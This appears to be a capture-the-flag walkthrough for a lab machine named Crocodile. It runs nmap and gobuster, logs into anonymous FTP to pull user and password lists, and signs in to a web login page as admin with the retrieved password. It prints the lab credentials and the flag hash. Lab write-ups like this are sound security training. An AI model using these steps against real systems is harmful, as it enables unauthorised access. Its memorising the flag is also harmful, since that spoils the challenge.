---

---
---
# Crocodile

---
## Getting Started
---
Use command to set Target IP
```bash
IP=10.129.112.127 ; echo $IP
```

Use command to set Target IP
```bash
HIP="$(ifconfig tun0  | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')" ; echo $HIP

```

---
## Enumeration

---
### NMAP

---
Nmap Command Ran
```bash
nmap -sV -sC $IP | copy
```

Results
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-30 17:50 EDT
Nmap scan report for 10.129.112.127
Host is up (0.028s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.180
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Smash - Bootstrap Business Template
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.93 seconds


```

**Findings**
Port 21 is running ftp and returned that Anonymous is allows
Port 80 is running web server Apache/2.4.41 (Ubuntu)

### FTP Enumeration
Logged in with anonymous as user name.

Command
```bash
ls
```

Result
```bash
229 Entering Extended Passive Mode (|||42585|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
```

Retrieve the two files

Command
```bash
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||42589|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |******************************************|    33       15.93 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (1.11 KiB/s)
ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||42185|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |******************************************|    62      194.05 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (2.17 KiB/s)

```

Result
```bash
Both were 

ls
allowed.userlist  allowed.userlist.passwd

```
**Findings**
After catting both files the returned the following

allow.userlist
>aron
>pwnmeow
>egotisticalsw
>admin

allow.userlist.passwd
>root
>Supersecretpassword1
>@BaASD&9032123sADS
>rKXM59ESxesUFHAd

### Website Enumeration
Nothing initially stands out and no login page

Command
```bash
gobuster dir --url http://$IP/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

Result
```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.112.127/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/09/30 18:05:20 Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 1577]
/assets               (Status: 301) [Size: 317] [--> http://10.129.112.127/assets/]
/css                  (Status: 301) [Size: 314] [--> http://10.129.112.127/css/]   
/js                   (Status: 301) [Size: 313] [--> http://10.129.112.127/js/]    
/logout.php           (Status: 302) [Size: 0] [--> login.php]                      
/config.php           (Status: 200) [Size: 0]                                      
/fonts                (Status: 301) [Size: 316] [--> http://10.129.112.127/fonts/] 
/dashboard            (Status: 301) [Size: 320] [--> http://10.129.112.127/dashboard/]
Progress: 86022 / 175330 (49.06%)                                                    ^C
[!] Keyboard interrupt detected, terminating.
                                                                                      
===============================================================
2022/09/30 18:10:49 Finished
===============================================================

```


**Findings**
Gobuster identified a /logon.php

---
## Foothold
Use the username:admin and password:rKXM59ESxesUFHAd from the retrieved files to log in

>![[Pasted image 20220930181504.png]]

---
## Flags
website
```bash
# c7110277ac44d78b6a9fff2232434d16
```

---
## Tags
---
#gobuster #ftp 